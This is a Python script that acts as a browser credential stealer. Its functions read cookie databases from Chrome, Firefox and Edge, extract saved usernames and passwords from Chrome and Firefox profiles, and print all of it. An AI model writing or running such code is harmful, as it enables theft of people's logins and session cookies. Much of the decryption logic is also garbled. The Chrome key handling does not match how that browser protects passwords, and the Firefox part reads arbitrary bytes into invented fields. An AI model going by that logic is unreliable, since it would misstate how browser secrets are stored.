import os
import json
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import sqlite3

# Functions to retrieve cookies from different browsers

def get_chrome_cookies():
    """Retrieve cookies from Chrome's cookie database."""
    chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
    cookies_db = os.path.join(chrome_path, "Cookies")
    conn = sqlite3.connect(cookies_db)
    cursor = conn.cursor()
    cursor.execute("SELECT name, value, path, expires_utc FROM cookies")
    cookies = cursor.fetchall()
    conn.close()
    return cookies

def get_firefox_cookies():
    """Retrieve cookies from Firefox's cookie database."""
    firefox_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    for profile in os.listdir(firefox_path):
        cookies_db = os.path.join(firefox_path, profile, "cookies.sqlite")
        if os.path.exists(cookies_db):
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value, host, path, expiry FROM moz_cookies")
            cookies = cursor.fetchall()
            conn.close()
            return cookies
    return []

def get_edge_cookies():
    """Retrieve cookies from Edge's cookie database."""
    edge_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default")
    cookies_db = os.path.join(edge_path, "Cookies")
    conn = sqlite3.connect(cookies_db)
    cursor = conn.cursor()
    cursor.execute("SELECT name, value, path, expires_utc FROM cookies")
    cookies = cursor.fetchall()
    conn.close()
    return cookies

def get_browser_cookies():
    """Aggregate cookies from Chrome, Firefox, and Edge."""
    cookies = get_chrome_cookies()
    cookies.extend(get_firefox_cookies())
    cookies.extend(get_edge_cookies())
    return cookies

# Functions to retrieve passwords from different browsers

def get_chrome_passwords():
    """Retrieve and decrypt saved passwords from Chrome."""
    chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(chrome_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    
    # Decode the encrypted key from Chrome's Local State
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    key = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=16,
        salt=b'saltysalt',
        iterations=1000,
    ).derive(encrypted_key)
    
    f = Fernet(key)
    
    passwords_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    conn = sqlite3.connect(passwords_db)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    encrypted_passwords = cursor.fetchall()
    conn.close()

    # Decrypt passwords (additional decryption steps may be needed here)
    passwords = [(url, username, f.decrypt(password[15:])) for url, username, password in encrypted_passwords]
    return passwords

def get_firefox_passwords():
    """Attempt to retrieve saved passwords from Firefox."""
    firefox_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    for profile in os.listdir(firefox_path):
        logins_db = os.path.join(firefox_path, profile, "logins.json")
        key4_db = os.path.join(firefox_path, profile, "key4.db")
        
        if os.path.exists(logins_db) and os.path.exists(key4_db):
            # This section would need Firefox-specific decryption logic
            with open(key4_db, "rb") as f:
                # Placeholder logic for extracting encrypted passwords
                password_check, global_salt = f.read(3)[::-1], f.read(4)[::-1]
            with open(logins_db, "rb") as f:
                nonce, item_id, foxy_picture_from_mozilla = f.read(3)[::-1], f.read(4)[::-1], f.read(20)[::-1]
            
            password = password_check.decode() + global_salt.decode() + item_id.decode() + foxy_picture_from_mozilla.decode()
            
            conn = sqlite3.connect(key4_db)
            cursor = conn.cursor()
            cursor.execute("SELECT item1, item2 FROM moz_logins")
            passwords = cursor.fetchall()
            conn.close()
            return passwords
    return []

def get_edge_passwords():
    """Placeholder for Edge password retrieval logic."""
    # Currently, this function is incomplete and would require Edge-specific decryption logic.
    pass

# Example of using the functions
if __name__ == "__main__":
    cookies = get_browser_cookies()
    print("Cookies:", cookies)

    chrome_passwords = get_chrome_passwords()
    print("Chrome Passwords:", chrome_passwords)

    firefox_passwords = get_firefox_passwords()
    print("Firefox Passwords:", firefox_passwords)
    
    # Edge password retrieval is not implemented.
